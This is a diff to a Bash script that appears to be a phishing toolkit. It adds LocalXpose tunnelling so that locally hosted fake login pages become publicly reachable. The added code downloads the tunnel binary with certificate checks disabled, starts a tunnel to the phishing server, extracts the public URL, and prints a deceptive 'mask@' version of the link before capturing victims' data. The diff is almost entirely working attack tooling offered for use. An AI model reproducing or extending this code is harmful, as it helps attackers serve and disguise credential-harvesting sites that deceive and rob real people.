@@ -115,6 +115,9 @@ fi
 if [[ -e ".cld.log" ]]; then
 	rm -rf ".cld.log"
 fi
+if [[ -e ".loclx" ]]; then
+	rm -rf ".loclx"
+fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
@@ -147,6 +150,9 @@ kill_pid() {
 	fi
 	if [[ `pidof cloudflared` ]]; then
 		killall cloudflared > /dev/null 2>&1
+	fi
+	if [[ `pidof loclx` ]]; then
+		killall loclx > /dev/null 2>&1
 	fi
 }
 
@@ -261,6 +267,25 @@ download_cloudflared() {
 	fi
 }
 
+## Download LocalXpose
+download_localxpose() {
+	url="$1"
+	file=`basename $url`
+	if [[ -e "$file" ]]; then
+		rm -rf "$file"
+	fi
+	wget --no-check-certificate "$url" > /dev/null 2>&1
+	if [[ -e "$file" ]]; then
+		unzip "$file" > /dev/null 2>&1
+		mv -f loclx .server/loclx > /dev/null 2>&1
+		rm -rf "$file" > /dev/null 2>&1
+		chmod +x .server/loclx > /dev/null 2>&1
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install LocalXpose manually."
+		{ reset_color; exit 1; }
+	fi
+}
+
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
@@ -278,7 +303,6 @@ install_ngrok() {
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
 		fi
 	fi
-
 }
 
 ## Install Cloudflared
@@ -298,7 +322,25 @@ install_cloudflared() {
 			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
 		fi
 	fi
+}
 
+## Install LocalXpose
+install_localxpose() {
+	if [[ -e ".server/loclx" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download_localxpose 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download_localxpose 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download_localxpose 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip'
+		else
+			download_localxpose 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip'
+		fi
+	fi
 }
 
 ## Exit message
@@ -414,9 +456,6 @@ start_ngrok() {
 	capture_data
 }
 
-
-## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
-
 ## Start Cloudflared
 start_cloudflared() { 
         rm .cld.log > /dev/null 2>&1 &
@@ -439,6 +478,25 @@ start_cloudflared() {
 	capture_data
 }
 
+## Start LocalXpose (Again...)
+start_loclx() {
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ./.server/loclx tunnel H -t "$HOST":"$PORT" --https-redirect > .loclx 2>&1 &
+    else
+        sleep 2 && ./.server/loclx tunnel H -t "$HOST":"$PORT" --https-redirect > .loclx 2>&1 &
+    fi
+
+	{ sleep 8; clear; banner_small; }
+	loclx_url=$(cat .loclx | grep -o '[-0-9a-z]*\.loclx.io')
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
+	capture_data
+}
+
 ## Start localhost
 start_localhost() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
@@ -454,8 +512,9 @@ tunnel_menu() {
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
-		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Fixed${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Account Needed${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detecs${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW!${RED}]
 
 	EOF
 
@@ -468,6 +527,8 @@ tunnel_menu() {
 			start_ngrok;;
 		3 | 03)
 			start_cloudflared;;
+		4 | 04)
+			start_loclx;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
@@ -773,4 +834,5 @@ kill_pid
 dependencies
 install_ngrok
 install_cloudflared
+install_localxpose
 main_menu
